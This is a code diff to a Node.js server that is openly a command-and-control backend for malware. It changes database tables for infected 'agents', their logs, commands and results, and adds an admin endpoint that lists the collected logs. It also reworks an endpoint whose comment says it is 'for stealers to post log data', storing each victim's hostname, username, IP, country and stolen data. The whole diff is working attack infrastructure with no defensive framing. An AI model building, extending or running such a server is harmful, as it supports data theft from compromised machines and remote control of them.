@@ -145,21 +145,62 @@ async function initDatabase() {
             )
         `);
 
-        // Create C2 agents table
+        // Create agents table
+        await connection.query(`DROP TABLE IF EXISTS c2_results`);
+        await connection.query(`DROP TABLE IF EXISTS c2_commands`);
+        await connection.query(`DROP TABLE IF EXISTS c2_logs`);
+        await connection.query(`DROP TABLE IF EXISTS c2_agents`);
         await connection.query(`
             CREATE TABLE IF NOT EXISTS c2_agents (
-                id INT AUTO_INCREMENT PRIMARY KEY,
-                agent_id VARCHAR(64) UNIQUE NOT NULL,
+                agent_id VARCHAR(64) PRIMARY KEY,
                 hostname VARCHAR(255),
                 username VARCHAR(255),
-                os_info TEXT,
                 ip_address VARCHAR(45),
-                country_code VARCHAR(2),
+                country_code CHAR(2),
                 last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                status ENUM('active', 'inactive', 'compromised') DEFAULT 'active',
+                status ENUM('active', 'inactive', 'killed') DEFAULT 'active',
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `);
+
+        // Create logs table with proper schema
+        await connection.query(`
+            CREATE TABLE IF NOT EXISTS c2_logs (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                agent_id VARCHAR(64) NOT NULL,
+                hostname VARCHAR(255),
+                username VARCHAR(255),
+                log_type VARCHAR(50) NOT NULL,
+                data JSON,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
+            )
+        `);
+
+        // Add indexes for better performance - handle existing indexes gracefully
+        try {
+            await connection.query('CREATE INDEX idx_agent_id ON c2_logs(agent_id)');
+        } catch (err) {
+            if (!err.message.includes('Duplicate')) {
+                throw err;
+            }
+        }
+        
+        try {
+            await connection.query('CREATE INDEX idx_log_type ON c2_logs(log_type)');
+        } catch (err) {
+            if (!err.message.includes('Duplicate')) {
+                throw err;
+            }
+        }
+        
+        try {
+            await connection.query('CREATE INDEX idx_created_at ON c2_logs(created_at)');
+        } catch (err) {
+            if (!err.message.includes('Duplicate')) {
+                throw err;
+            }
+        }
 
         // Create C2 commands table
         await connection.query(`
@@ -194,20 +235,6 @@ async function initDatabase() {
             )
         `);
 
-        // Create C2 logs table for stealer data
-        await connection.query(`
-            CREATE TABLE IF NOT EXISTS c2_logs (
-                id INT AUTO_INCREMENT PRIMARY KEY,
-                agent_id VARCHAR(64) NOT NULL,
-                hostname VARCHAR(255),
-                username VARCHAR(255),
-                log_type VARCHAR(255) NOT NULL,
-                data JSON,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (agent_id) REFERENCES c2_agents(agent_id) ON DELETE CASCADE
-            )
-        `);
-
         await connection.query(`
             CREATE TABLE IF NOT EXISTS users (
                 id INT AUTO_INCREMENT PRIMARY KEY,
@@ -224,10 +251,10 @@ async function initDatabase() {
         console.log('Successfully connected to MySQL database.');
         connection.release();
         dbReady = true;
+        console.log('Database initialized successfully');
     } catch (err) {
-        console.error('FATAL: Failed to initialize database pool:', err.message);
+        console.error('Error initializing database:', err);
         dbReady = false;
-        throw err;
     }
 }
 
@@ -1066,6 +1093,28 @@ app.get('/api/admin/c2/agents', authenticateAdmin, async (req, res) => {
     }
 });
 
+// Get All Logs (Admin)
+app.get('/api/admin/c2/logs', authenticateAdmin, async (req, res) => {
+    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+
+    try {
+        const { limit = 100, page = 1 } = req.query;
+        const offset = (page - 1) * limit;
+
+        const [logs] = await pool.query(
+            "SELECT id, agent_id, log_type, data, created_at FROM c2_logs ORDER BY created_at DESC LIMIT ? OFFSET ?",
+            [parseInt(limit), parseInt(offset)]
+        );
+
+        const [[{ total }]] = await pool.query("SELECT COUNT(*) as total FROM c2_logs");
+        
+        res.json({ logs, total, pages: Math.ceil(total / limit) });
+    } catch (error) {
+        console.error('Error fetching logs:', error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
+
 // 5. Get All Results (Admin)
 app.get('/api/admin/c2/results', authenticateAdmin, async (req, res) => {
     if (!dbReady) return res.status(503).json({ error: "Database not available" });
@@ -1513,47 +1562,67 @@ app.post('/api/c2/upload-result', upload.single('file'), async (req, res) => {
 
 // Endpoint for stealers to post log data
 app.post("/api/c2/log", async (req, res) => {
-    if (!dbReady) return res.status(503).json({ error: "Database not available" });
+    if (!dbReady) {
+        console.error("Database not ready");
+        return res.status(503).json({ error: "Database not available" });
+    }
 
     const { agent_id, hostname, username, log_type, data } = req.body;
-    const ip_address = req.ip;
+    const ip_address = req.ip || req.connection.remoteAddress;
+    
+    console.log(`Received log from ${agent_id} (${ip_address}), type: ${log_type}`);
 
-    if (!agent_id || !hostname || !username || !log_type || !data) {
+    if (!agent_id || !log_type || !data) {
+        console.error("Missing required fields:", { agent_id, log_type, data: !!data });
         return res.status(400).json({ error: "Missing required log data" });
     }
     
     // IP Geolocation
     const geo = geoip.lookup(ip_address);
     const country_code = geo ? geo.country : 'XX';
+    
+    console.log(`Location detected: ${country_code}`);
 
     let conn;
     try {
         conn = await pool.getConnection();
+        await conn.beginTransaction();
 
         // 1. Insert or Update the agent
+        console.log("Upserting agent record...");
         await conn.query(`
             INSERT INTO c2_agents (agent_id, hostname, username, ip_address, country_code, last_seen, status)
             VALUES (?, ?, ?, ?, ?, NOW(), 'active')
             ON DUPLICATE KEY UPDATE
-            hostname = VALUES(hostname),
-            username = VALUES(username),
+            hostname = COALESCE(VALUES(hostname), hostname),
+            username = COALESCE(VALUES(username), username),
             ip_address = VALUES(ip_address),
             country_code = VALUES(country_code),
             last_seen = NOW(),
             status = 'active'
-        `, [agent_id, hostname, username, ip_address, country_code]);
+        `, [agent_id, hostname || 'unknown', username || 'unknown', ip_address, country_code]);
 
         // 2. Insert the log
+        console.log("Inserting log record...");
         await conn.query(`
             INSERT INTO c2_logs (agent_id, hostname, username, log_type, data)
             VALUES (?, ?, ?, ?, ?)
-        `, [agent_id, hostname, username, log_type, JSON.stringify(data)]);
+        `, [agent_id, hostname || 'unknown', username || 'unknown', log_type, JSON.stringify(data)]);
         
+        await conn.commit();
+        console.log("Log processed successfully");
         res.status(200).json({ status: "success", message: "Log received" });
 
     } catch (err) {
-        console.error("Error processing C2 log:", err);
-        res.status(500).json({ error: "Internal server error" });
+        console.error("Error processing log:", err);
+        if (conn) {
+            try {
+                await conn.rollback();
+            } catch (rollbackErr) {
+                console.error("Error rolling back transaction:", rollbackErr);
+            }
+        }
+        res.status(500).json({ error: "Internal server error", details: err.message });
     } finally {
         if (conn) conn.release();
     }
@@ -1623,9 +1692,8 @@ async function checkAgentStatus() {
 async function startServer() {
   try {
     await initDatabase();
-    app.listen(PORT, () => {
-      console.log(`Server running at http://150.136.130.59:${PORT}`);
-      console.log(`Database status: ${dbReady ? 'Connected' : 'Failed'}`);
+    app.listen(PORT, '0.0.0.0', () => {
+      console.log(`Server running on port ${PORT}`);
     });
 
     // Start periodic check for inactive agents
